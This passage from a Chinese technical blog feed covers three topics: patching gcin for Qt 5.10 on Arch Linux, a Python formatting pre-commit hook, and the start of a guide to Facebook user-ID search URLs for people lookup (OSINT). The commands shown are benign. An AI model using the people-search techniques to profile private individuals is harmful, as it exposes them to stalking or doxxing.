&lt;p&gt;&lt;a href="https://github.com/qutebrowser/qutebrowser"&gt;qutebrowser&lt;/a&gt; 是一款以 Vim 操作流程為主、基於 PyQt5 上開發的的輕量化瀏覽器（有點類似 &lt;a href="https://bitbucket.org/portix/dwb"&gt;dwb&lt;/a&gt;）。2017 年中的時候就知道這款瀏覽器了，但沒有特別強烈的需求，因為我在使用 Firefox 或 Chromium 的時候都有安裝 Vimium 這個套件，所以可以做到一樣的事。  &lt;/p&gt;
&lt;p&gt;2017 年後半從 Firefox 55.0 開始，使用 Quantum 之後，我就從 Chromium 又跳回 Firefox 的懷抱，但接近 2017 年年底的時候，這篇文章：&lt;a href="https://sircmpwn.github.io/2017/12/16/Firefox-is-on-a-slippery-slope.html"&gt;Firefox is on a slippery slope | Drew DeVault’s Blog&lt;/a&gt;，講到了 Firefox 和美國的 NBCUniversal "合作"，為該公司新一季的電視劇 "Mr.Robot" 作宣傳。其手法是當你在瀏覽網頁的時候，如果裏面文字有和該劇相關的關鍵字的話，就會被倒過來顯示，而且也會在你造訪某些特定網站的時候，在你的 HTTP request 加入特定的 Header。重點是這是在未經使用者同意就預設開啟的測試功能內，直接幫使用者安裝一個叫作 "Looking Glass" 的 plugin，而且如果你把它關掉的話，在下次更新 Firefox 的時候又會被自動開啟。  &lt;/p&gt;
&lt;p&gt;再者是，討論這個功能的 ticket 是被鎖定的，只有 Mozilla 內部的人可以看到。這是非常不尊重使用者的行為，尤其 Firefox 又總是以不追蹤使用者、自由的開源軟體自居。雖然 Mozilla 在幾天後發了篇道歉文：&lt;a href="https://blog.mozilla.org/firefox/update-looking-glass-add/"&gt;Update: Looking Glass Add-on | The Firefox Frontier&lt;/a&gt;，但這件事還是讓滿多人留下不好的印象的，畢竟這代表專案主導人不尊重使用者，難保之後不會又發生。  &lt;/p&gt;
&lt;p&gt;剛好這篇文章的作者有提到他已經換到 qutebrowser 一陣子了，覺得還不錯用。剛好我也有在考慮要不要換過去使用，因為用了 Firefox 一陣子，雖然有比以前快，但還是常常會 crash，而且貌似也有 Memory Leak 的問題，常常用了一陣子記憶體就會愈用愈多，得重開才能解決。所以今天就下定決心拿 qutebrowser 來當預設的瀏覽器。  &lt;/p&gt;
&lt;p&gt;有機會的話可能會寫篇關於 qutebrowser 的介紹文，因為預設的 qutebrowser 其實不太好用，我花了點時間調整了設定才覺得比較能用。但這篇文章是要紀錄我在 Arch Linux 上安裝了基於 Qt5 開發的 qutebrowser 後，無法在其中使用 gcin 輸入法打中文字的問題。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;正文&lt;/h2&gt;
&lt;p&gt;這篇應該只有在 Arch Linux 上的使用者可能會遇到，解法是在 gcin 論壇的這個討論串看到的：&lt;a href="https://hyperrate.com/thread.php?tid=33785"&gt;在基於較新版qt 5.9.1的軟體中無法輸入中文&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;先附上發生 bug 的軟體版本：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;gcin 2.8.5-2  &lt;/li&gt;
&lt;li&gt;Qt 5.10.0  &lt;/li&gt;
&lt;li&gt;qutebrowser v1.0.4  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;步驟：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先到 &lt;a href="https://git.archlinux.org/svntogit/packages.git/tree/trunk?h=packages/gcin"&gt;https://git.archlinux.org/svntogit/packages.git/tree/trunk?h=packages/gcin&lt;/a&gt; 把要 build &lt;code&gt;gcin&lt;/code&gt; 需要的檔案都抓下來，開個資料夾放這些檔案。  &lt;/li&gt;
&lt;li&gt;進到該資料夾內，根據討論串裡提到的解法修改 &lt;code&gt;PKGBUILD&lt;/code&gt;，加上這個 patch，&lt;a href="/files/solution-for-gcin-2-8-5-2-cannot-run-in-application-using-qt-after-5-9-x-on-arch-linux/qt-5.9.patch"&gt;這裡附上 patch 的純文字檔連結&lt;/a&gt;：  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;diff --git a/gcin/trunk/PKGBUILD b/gcin/trunk/PKGBUILD  &lt;/span&gt;
&lt;span class="gh"&gt;index ca08fcb57f3..7048c13411d 100644  &lt;/span&gt;
&lt;span class="gd"&gt;--- a/gcin/trunk/PKGBUILD  &lt;/span&gt;
&lt;span class="gi"&gt;+++ b/gcin/trunk/PKGBUILD  &lt;/span&gt;
&lt;span class="gu"&gt;@@ -39,6 +39,12 @@ prepare() {  &lt;/span&gt;
         -e &amp;#39;/^MODVERSION=/a INCS+=-I/usr/include/qt/QtGui/$(MODVERSION) -I/usr/include/qt/QtCore/$(MODVERSION)&amp;#39; \  
         -i qt5-im/Makefile  

&lt;span class="gi"&gt;+    # Patch to make gcin work in qt &amp;gt;= 5.9.x  &lt;/span&gt;
&lt;span class="gi"&gt;+    # ref: &amp;lt;https://hyperrate.com/thread.php?tid=33785&amp;gt;  &lt;/span&gt;
&lt;span class="gi"&gt;+      sed \  &lt;/span&gt;
&lt;span class="gi"&gt;+          -e &amp;#39;s/org.qt-project.Qt.QPlatformInputContextFactoryInterface/&amp;amp;.5.1/&amp;#39; \  &lt;/span&gt;
&lt;span class="gi"&gt;+          -i qt5-im/gcin-qt5.h.in  &lt;/span&gt;
&lt;span class="gi"&gt;+  &lt;/span&gt;
     # FS#45732  
     patch -p1 -i ../qt-5.5.patch  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;在該資料夾內下 &lt;code&gt;makepkg -s&lt;/code&gt; 這個指令，就會開始 build gcin  &lt;/li&gt;
&lt;li&gt;build 好之後應該會出現 &lt;code&gt;gcin-2.8.5-2-x86_64.pkg.tar.xz&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;sudo pacman -U gcin-2.8.5-2-x86_64.pkg.tar.xz&lt;/code&gt; 來安裝 patch 過後的 gcin  &lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;qtplugininfo /usr/lib/qt/plugins/platforminputcontexts/libgcinplatforminputcontextplugin.so&lt;/code&gt; 來檢查  &lt;ul&gt;
&lt;li&gt;如果沒問題的話應該會得到下面這樣的輸出：  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ qtplugininfo /usr/lib/qt/plugins/platforminputcontexts/libgcinplatforminputcontextplugin.so  
IID &lt;span class="s2"&gt;&amp;quot;org.qt-project.Qt.QPlatformInputContextFactoryInterface.5.1&amp;quot;&lt;/span&gt; Qt &lt;span class="m"&gt;5&lt;/span&gt;.10.0 &lt;span class="o"&gt;(&lt;/span&gt;debug&lt;span class="o"&gt;)&lt;/span&gt;  
User Data: &lt;span class="o"&gt;{&lt;/span&gt;  
    &lt;span class="s2"&gt;&amp;quot;Keys&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;  
        &lt;span class="s2"&gt;&amp;quot;gcin&amp;quot;&lt;/span&gt;  
    &lt;span class="o"&gt;]&lt;/span&gt;  
&lt;span class="o"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;重新開啟 gcin  &lt;/li&gt;
&lt;li&gt;重開 qutebrowser  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這樣應該就沒問題了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;總之，我發了一個 bug report: &lt;a href="https://bugs.archlinux.org/task/56949"&gt;FS#56949 : [gcin] gcin 2.8.5-2 cannot run in qutebrowser v1.0.4&lt;/a&gt;，希望這個 patch 會被加進去，這樣之後更新應該就沒問題了。  &lt;/p&gt;
&lt;p&gt;好像有點久沒有自己 build package 了啊，原本打算用 &lt;code&gt;abs&lt;/code&gt;，然後才想起來 &lt;code&gt;abs&lt;/code&gt; 已經被 deprecated 了：&lt;a href="https://www.archlinux.org/news/deprecation-of-abs/"&gt;Arch Linux - News: Deprecation of ABS tool and rsync endpoint&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/qutebrowser/qutebrowser"&gt;GitHub - qutebrowser/qutebrowser: A keyboard-driven, vim-like browser based on PyQt5.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://bitbucket.org/portix/dwb"&gt;portix / dwb — Bitbucket&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://sircmpwn.github.io/2017/12/16/Firefox-is-on-a-slippery-slope.html"&gt;Firefox is on a slippery slope | Drew DeVault’s Blog&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.mozilla.org/firefox/update-looking-glass-add/"&gt;Update: Looking Glass Add-on | The Firefox Frontier&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hyperrate.com/thread.php?tid=33785"&gt;在基於較新版qt 5.9.1的軟體中無法輸入中文&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Arch Linux"></category><category term="Qt5"></category><category term="qutebrowser"></category><category term="gcin"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>嘗試在 Python 中做到 Golang fmt 的效果</title><link href="https://blog.m157q.tw/posts/2018/01/03/try-to-do-gofmt-in-python/" rel="alternate"></link><published>2018-01-18T03:11:54+08:00</published><updated>2018-01-18T03:11:54+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-03:posts/2018/01/03/try-to-do-gofmt-in-python/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;去年開始學 Golang，但早在這之前就已經聽過很多 Gopher 說過 &lt;code&gt;gofmt&lt;/code&gt; 有多麼方便，當 Pythonista 還在靠 syntax checker 和自制力來遵守 &lt;a href="https://www.python.org/dev/peps/pep-0008/"&gt;PEP8&lt;/a&gt; 的時候，Gopher 根本都不用管什麼 coding style，不管你是怎麼寫的，只要寫好之後用 &lt;code&gt;gofmt&lt;/code&gt; 執行一下，就可以自動幫你把程式碼排版排好，還可以順便幫你檢查錯誤。  &lt;/p&gt;
&lt;p&gt;故事起源於 2016 底，和平常不是寫 Python 的朋友一起弄了一個用 Python 寫的 side project，因為朋友平常不是寫 Python 的，然後那陣子他又剛好在寫 Golang，覺得要遵守 PEP8 很麻煩，所以問我 Python 有沒有類似 &lt;code&gt;go fmt&lt;/code&gt; 的工具。  &lt;/p&gt;
&lt;p&gt;當下想了一下好像還真的沒有，頂多就是像 &lt;code&gt;pep8&lt;/code&gt;, &lt;code&gt;flake8&lt;/code&gt;, &lt;code&gt;pyflakes&lt;/code&gt; 這類的 syntax checker 而已，好像沒聽聞過什麼好用的 code formatter，也因為這樣，所以開始想辦法做到這件事。  &lt;/p&gt;
&lt;p&gt;當然真的去查了之後發現還是有的，但使用起來不盡理想。於是找了些現成的程式兜一兜，再加上 git pre-commit hook 後，最後算是勉強做到了，當下有做個凌亂的紀錄，但一直沒有整理成一篇文章，利用最近離職後比較閒的時間，把它整理紀錄一下。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄&lt;/h2&gt;
&lt;p&gt;當時一開始是直接找到 GitHub 上的這個 repo: &lt;a href="https://github.com/Psycojoker/pyfmt"&gt;GitHub - Psycojoker/pyfmt: automatic code formatter for python following pep8 using baron FST, like gofmt&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;看起來好像不錯，但實際上使用起來有滿多問題的，而且作者又用了另外一個自己寫的 Python Full Syntax Tree library: &lt;a href="https://github.com/PyCQA/baron"&gt;GitHub - PyCQA/baron: IDE allow you to refactor code, Baron allows you to write refactoring code.&lt;/a&gt;，當時因為急著找現成的工具來用，所以就沒有多花時間研究。但後來才發現 PyCQA 裡頭的工具都滿不錯的: &lt;a href="https://github.com/PyCQA"&gt;Python Code Quality Authority · GitHub&lt;/a&gt;，基本上都是用來提升 Python 程式碼品質的工具，滿推薦寫 Python 的人看一下的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;之後試了幾個工具以後，最後變成 &lt;code&gt;autoflake&lt;/code&gt; + &lt;code&gt;isort&lt;/code&gt; + &lt;code&gt;autopep8&lt;/code&gt; + git pre-commit hook 來做到這件事，老實說真的有點繁瑣，但我找不到更好的方法，如果有人知道的話還請不吝告知。  &lt;/p&gt;
&lt;p&gt;總之，接下來稍微介紹一下這幾個工具分別做了哪些事：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;autoflake&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/myint/autoflake"&gt;GitHub - myint/autoflake: Removes unused imports and unused variables as reported by pyflakes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;就如同其 GitHub 的敘述，可以把沒有用到的 &lt;code&gt;import&lt;/code&gt; 和變數移除。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;isort&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/timothycrosley/isort"&gt;GitHub - timothycrosley/isort: A Python utility / library to sort imports.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;可以針對 Python 的 imports 做符合 PEP8 的字母序排序。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;autopep8&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/hhatto/autopep8"&gt;GitHub - hhatto/autopep8: A tool that automatically formats Python code to conform to the PEP 8 style guide.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;可以將 Python 程式碼自動以符合 PEP8 的方式排版。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;git pre-commit hook  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks"&gt;Git - Git Hooks&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;pre-commit hook 的觸發時間是在使用者下 &lt;code&gt;git commit&lt;/code&gt; 後，編寫 commit message 之前。  &lt;/li&gt;
&lt;li&gt;這裡是用來確保使用者每次 commit 的 Python 程式碼會被以上這三種程式處理過。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;後來發現 Google 也出了一個 Python formatter: &lt;a href="https://github.com/google/yapf"&gt;GitHub - google/yapf: A formatter for Python files&lt;/a&gt;，用了以後覺得比 &lt;code&gt;autopep8&lt;/code&gt; 好用，所以就把 &lt;code&gt;autopep8&lt;/code&gt; 換成 &lt;code&gt;yapf&lt;/code&gt; 了：&lt;a href="https://github.com/pellaeon/fengyuan/commit/abc9fc995a9c49fa208716954c2bc262fe6b783e"&gt;Use yapf instead of autopep8 as python code formatter. · pellaeon/fengyuan@abc9fc9 · GitHub&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;結果&lt;/h2&gt;
&lt;p&gt;最後的結果就是整合到一個 git pre-commit hook 裡頭，麻煩的是 clone 下來以後，得用這個指令初始化 git pre-commit hook：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ln -sf ../../pre-commit.sh .git/hooks/pre-commit  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其實還是很麻煩，之後應該會再繼續尋找有沒有更方便的方法，不排除自己寫一個就是。  &lt;/p&gt;
&lt;p&gt;最後的結果就是一個 git pre-commit hook：&lt;a href="https://github.com/pellaeon/fengyuan/blob/master/pre-commit.sh"&gt;fengyuan/pre-commit.sh at master · pellaeon/fengyuan · GitHub&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;以下直接複製貼上原程式碼留個紀錄，以防哪天 GitHub 掛了。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/sh  &lt;/span&gt;
&lt;span class="c1"&gt;#  &lt;/span&gt;
&lt;span class="c1"&gt;# An example hook script to verify what is about to be committed.  &lt;/span&gt;
&lt;span class="c1"&gt;# Called by &amp;quot;git commit&amp;quot; with no arguments.  The hook should  &lt;/span&gt;
&lt;span class="c1"&gt;# exit with non-zero status after issuing an appropriate message if  &lt;/span&gt;
&lt;span class="c1"&gt;# it wants to stop the commit.  &lt;/span&gt;
&lt;span class="c1"&gt;#  &lt;/span&gt;
&lt;span class="c1"&gt;# To enable this hook, rename this file to &amp;quot;pre-commit&amp;quot;.  &lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; git rev-parse --verify HEAD &amp;gt;/dev/null &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;  
&lt;span class="k"&gt;then&lt;/span&gt;  
    &lt;span class="nv"&gt;against&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;HEAD  
&lt;span class="k"&gt;else&lt;/span&gt;  
    &lt;span class="c1"&gt;# Initial commit: diff against an empty tree object  &lt;/span&gt;
    &lt;span class="nv"&gt;against&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4b825dc642cb6eb9a060e54bf8d69288fbee4904  
&lt;span class="k"&gt;fi&lt;/span&gt;  

&lt;span class="c1"&gt;# If you want to allow non-ASCII filenames set this variable to true.  &lt;/span&gt;
&lt;span class="nv"&gt;allownonascii&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;git config --bool hooks.allownonascii&lt;span class="k"&gt;)&lt;/span&gt;  

&lt;span class="c1"&gt;# Redirect output to stderr.  &lt;/span&gt;
&lt;span class="nb"&gt;exec&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;  

&lt;span class="c1"&gt;# Cross platform projects tend to avoid non-ASCII filenames; prevent  &lt;/span&gt;
&lt;span class="c1"&gt;# them from being added to the repository. We exploit the fact that the  &lt;/span&gt;
&lt;span class="c1"&gt;# printable range starts at the space character and ends with tilde.  &lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$allownonascii&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; !&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;true&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;  
    &lt;span class="c1"&gt;# Note that the use of brackets around a tr range is ok here, (it&amp;#39;s  &lt;/span&gt;
    &lt;span class="c1"&gt;# even required, for portability to Solaris 10&amp;#39;s /usr/bin/tr), since  &lt;/span&gt;
    &lt;span class="c1"&gt;# the square bracket bytes happen to fall in the designated range.  &lt;/span&gt;
    &lt;span class="nb"&gt;test&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;git diff --cached --name-only --diff-filter&lt;span class="o"&gt;=&lt;/span&gt;A -z &lt;span class="nv"&gt;$against&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;  
      &lt;span class="nv"&gt;LC_ALL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;C tr -d &lt;span class="s1"&gt;&amp;#39;[ -~]\0&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; wc -c&lt;span class="k"&gt;)&lt;/span&gt; !&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;  
&lt;span class="k"&gt;then&lt;/span&gt;  
    cat &lt;span class="s"&gt;&amp;lt;&amp;lt;\EOF  &lt;/span&gt;
&lt;span class="s"&gt;Error: Attempt to add a non-ASCII file name.  &lt;/span&gt;

&lt;span class="s"&gt;This can cause problems if you want to work with people on other platforms.  &lt;/span&gt;

&lt;span class="s"&gt;To be portable it is advisable to rename the file.  &lt;/span&gt;

&lt;span class="s"&gt;If you know what you are doing you can disable this check using:  &lt;/span&gt;

&lt;span class="s"&gt;  git config hooks.allownonascii true  &lt;/span&gt;
&lt;span class="s"&gt;EOF&lt;/span&gt;  
    &lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;  
&lt;span class="k"&gt;fi&lt;/span&gt;  

&lt;span class="c1"&gt;# Run syntax checker and formatter for Python files.  &lt;/span&gt;
&lt;span class="nv"&gt;STAGED_PYTHON_FILES&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;git diff --cached --name-only HEAD &lt;span class="s2"&gt;&amp;quot;*.py&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;  

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$STAGED_PYTHON_FILES&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; !&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;  
&lt;span class="k"&gt;then&lt;/span&gt;  
    autoflake -i --remove-all-unused-imports --remove-unused-variables &lt;span class="nv"&gt;$STAGED_PYTHON_FILES&lt;/span&gt;  
    isort -y &lt;span class="nv"&gt;$STAGED_PYTHON_FILES&lt;/span&gt;  
    yapf -i &lt;span class="nv"&gt;$STAGED_PYTHON_FILES&lt;/span&gt;  
    git add &lt;span class="nv"&gt;$STAGED_PYTHON_FILES&lt;/span&gt;  
&lt;span class="k"&gt;fi&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Psycojoker/pyfmt"&gt;GitHub - Psycojoker/pyfmt: automatic code formatter for python following pep8 using baron FST, like gofmt&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/PyCQA/baron"&gt;GitHub - PyCQA/baron: IDE allow you to refactor code, Baron allows you to write refactoring code.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/myint/autoflake"&gt;GitHub - myint/autoflake: Removes unused imports and unused variables as reported by pyflakes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/timothycrosley/isort"&gt;GitHub - timothycrosley/isort: A Python utility / library to sort imports.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hhatto/autopep8"&gt;GitHub - hhatto/autopep8: A tool that automatically formats Python code to conform to the PEP 8 style guide.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks"&gt;Git - Git Hooks&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/yapf"&gt;GitHub - google/yapf: A formatter for Python files&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pellaeon/fengyuan/commit/abc9fc995a9c49fa208716954c2bc262fe6b783e"&gt;Use yapf instead of autopep8 as python code formatter. · pellaeon/fengyuan@abc9fc9 · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pellaeon/fengyuan/commit/2de3e199f2193ea25f4cd5bbb7f89673879862c6"&gt;Add git pre-commit hook for python files. · pellaeon/fengyuan@2de3e19 · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pellaeon/fengyuan/blob/master/pre-commit.sh"&gt;fengyuan/pre-commit.sh at master · pellaeon/fengyuan · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="formatter"></category><category term="Golang"></category><category term="gofmt"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>Facebook 網址的一些黑魔法</title><link href="https://blog.m157q.tw/posts/2018/01/02/tips-about-facebook-url/" rel="alternate"></link><published>2018-01-03T19:01:27+08:00</published><updated>2018-01-03T19:01:27+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-02:posts/2018/01/02/tips-about-facebook-url/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://netbootcamp.org/facebookpeoplesearchtips/"&gt;https://netbootcamp.org/facebookpeoplesearchtips/&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;去年因為一些事件得知 Facebook 的網址列可以針對單一使用者作滿多查詢的，當下就有紀錄起來，但遲遲沒有整理成一篇文章。其實也是看到有人講了以後去做了些查詢，發現這篇英文文章：&lt;a href="https://netbootcamp.org/facebookpeoplesearchtips/"&gt;Facebook People Search Tips | OSINT Training by Bob Brasich&lt;/a&gt; 整理的挺完整的，所以這篇文章算是擷取整理這篇文章的內容，然後以中文呈現。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;要先知道什麼是 Facebook User ID&lt;/h2&gt;
&lt;p&gt;首先，你要知道你想查詢的使用者在 Facebook 上的 ID 是什麼，對這個有點概念的人都會知道這是一串流水號，而最常見的例子就是 Facebook 創辦人 Mark Zuckerburg 本人的 Facebook ID 是 4，所以你只要連到 &lt;a href="https://www.facebook.com/4"&gt;https://www.facebook.com/4&lt;/a&gt;，就會連到 Mark Zuckerburg 本人的 Facebook 頁面，而每一位 Facebook 使用者都會有這樣一個不與其他使用者重複的流水號作為其 Facebook 的 ID。  &lt;/p&gt;
&lt;p&gt;在接下來的使用方式裡頭，一定要要拿到使用者的 ID，拿到使用者自己自訂的唯一 username 是沒用的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;要怎麼拿到 Facebook 使用者的 ID？&lt;/h2&gt;
&lt;p&gt;如果該名使用者沒有自訂 username 的話，只要連到該名 Facebook 使用者的個人頁面後，檢查一下網址列，就會看到最後面應該會是一串數字，那個就是該名使用者的 Facebook。  &lt;/p&gt;
&lt;p&gt;如果該名使用者有自訂 username 的話，你連到他的 Facebook 個人頁面應該會看到網址最後面就是他自訂的 username，而不會是 Facebook User ID。這時候可以透過這個網頁來做查詢：&lt;a href="https://findmyfbid.in"&gt;https://findmyfbid.in&lt;/a&gt;，這個網站本身就有教學了，用法也很簡單。  &lt;/p&gt;
&lt;p&gt;一樣是連到該名 Facebook 使用者的個人頁面，把他的網址複製下來，然後貼到 &lt;a href="https://findmyfbid.in"&gt;https://findmyfbid.in&lt;/a&gt; 進行查詢就行了。如果有順利查詢到的話，就會得到代表該名 Facebook 使用者的一串數字，即為其 ID。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;拿到 ID 後？&lt;/h2&gt;
&lt;p&gt;就可以進入正題了，一般人在 Facebook 進行搜尋的時候，應該普遍都是透過網頁上方的 Search bar 進行搜尋吧？這些查詢的結果都是透過 API 進行搜尋的，其實可以透過修改網址直接得到查詢結果，操作方式也不難，以下簡單講解。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;基本格式&lt;/h2&gt;
&lt;p&gt;最基本的網址格式長的像這樣：  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://www.facebook.com/search/str/$FACEBOOK_USER_ID&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;也可以是  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;fb.com/search/str/$FACEBOOK_USER_ID&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;以 Mark Zuckerburg 為例的話，就會是：  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://www.facebook.com/search/str/4&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;或是  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;fb.com/search/4&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;知道了這個基本格式以後，接下來會加上的參數都是加在後面，就可以得到相對應的搜尋結果，這個方法可以用在所有的使用者身上，但得到的結果會是以你登入的 Facbeook 帳號權限而定，並不會得到該名使用者所有的資訊，除非你是查詢你目前登入的 Facebook 使用者。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;基本參數&lt;/h2&gt;
&lt;p&gt;以下參數都是直接接在上面提到的基本格式字串的後面就行了，會是這樣的形式：  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;fb.com/search/str/$FACEBOOK_USER_ID/$OPTION&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;舉例來說，如果選項是下面提到的 &lt;code&gt;/photos-by/&lt;/code&gt; 的話，就會是這樣使用：  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://fb.com/search/4/photos-by/"&gt;&lt;code&gt;fb.com/search/4/photos-by/&lt;/code&gt;&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;其他參數依此類推，以下就列出有哪些參數可以使用，因為這些參數其實都已經和使用英文版 Facebook 搜尋時會顯示的一般英文一樣了，所以就不多做說明，有興趣的人可以試一試。  &lt;/p&gt;
